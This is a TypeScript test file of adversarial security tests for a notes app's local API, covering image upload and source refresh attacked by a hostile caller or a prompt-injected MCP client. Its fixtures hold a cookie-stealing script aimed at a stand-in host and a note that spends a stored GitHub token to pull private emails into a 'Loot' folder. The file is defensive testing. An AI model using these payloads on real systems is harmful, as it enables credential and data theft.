/*
 * Adversarial: the routes added for images, quick add, calendar and source
 * refresh, attacked as a local API caller or a prompt-injected MCP client.
 * Each test names the invariant it holds the route to, and fails today.
 */

import { describe, expect, it } from 'vitest';
import { encodeBase64 } from '@atlas/domain';
import { apiFixture, bodyOf, encoded, FAKE_PNG } from '../testing/api-fixture.ts';

const NOTE = 'Work/Plan.md';

describe('PUT /v1/notes/{path}/images/{name}, attacked', () => {
  it('never changes an image the caller did not start: a next chunk cannot extend one already in the vault', async () => {
    // The user's own photo, pasted in the app long ago.
    const theirs = Uint8Array.from([...FAKE_PNG, 7, 7, 7]);
    const api = apiFixture({ files: { [NOTE]: '# Plan\n' } });
    api.binaries.set('attachments/holiday.png', theirs);

    // No first chunk was ever sent: the caller just claims to be continuing.
    const response = await api.send({
      method: 'PUT',
      path: `/v1/notes/${encoded(NOTE)}/images/${encoded('holiday.png')}`,
      body: { base64: encodeBase64(new TextEncoder().encode('garbage')), offset: theirs.length },
    });

    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(api.binaries.get('attachments/holiday.png')).toEqual(theirs);
  });

  it('refuses an HTML document sent as an SVG: bytes that only claim to be a picture are refused', async () => {
    const api = apiFixture({ files: { [NOTE]: '# Plan\n' } });
    const page =
      '<!DOCTYPE html><html><body><script>fetch("//x.example/"+document.cookie)</script>';

    const response = await api.send({
      method: 'PUT',
      path: `/v1/notes/${encoded(NOTE)}/images/${encoded('chart.svg')}`,
      body: { text: page },
    });

    expect(response.status).toBe(400);
    expect(api.binaries.has('attachments/chart.svg')).toBe(false);
  });
});

describe('POST /v1/sources/{path}/refresh, attacked', () => {
  const PLAIN = 'Plain.md';

  /** A note the API itself turns into a source that spends the `github` Keychain secret. */
  async function apiAuthoredSource() {
    const api = apiFixture({ files: { [PLAIN]: '# Plain\n' } });
    api.folders.add('Loot');
    api.feed = async () => JSON.stringify([{ id: 'e1', name: 'james@private.example' }]);
    const patched = await api.send({
      method: 'PATCH',
      path: `/v1/notes/${encoded(PLAIN)}/properties`,
      body: {
        set: {
          atlas: 'source',
          format: 'json',
          // Same host the secret is bound to, so ADR-0017's binding lets it through;
          // the path is the caller's choice, not the user's.
          url: 'https://api.github.com/user/emails?access_token={{secret:github}}',
          into: 'Loot',
          type: 'loot',
        },
      },
    });
    expect(patched.status).toBe(200);
    return api;
  }

  it('never spends a Keychain secret on a source the API itself wrote', async () => {
    const api = await apiAuthoredSource();

    const response = await api.send({
      method: 'POST',
      path: `/v1/sources/${encoded(PLAIN)}/refresh`,
    });

    // Today: 200, the host is handed { secret: 'github' } for a URL the caller
    // chose, and what the token can read lands in notes the API can read back.
    expect(api.fetches).toEqual([]);
    expect(response.status).toBeGreaterThanOrEqual(400);
    expect([...api.files.keys()].filter((path) => path.startsWith('Loot/'))).toEqual([]);
    expect(JSON.stringify(bodyOf(response))).not.toContain('"created":1');
  });
});
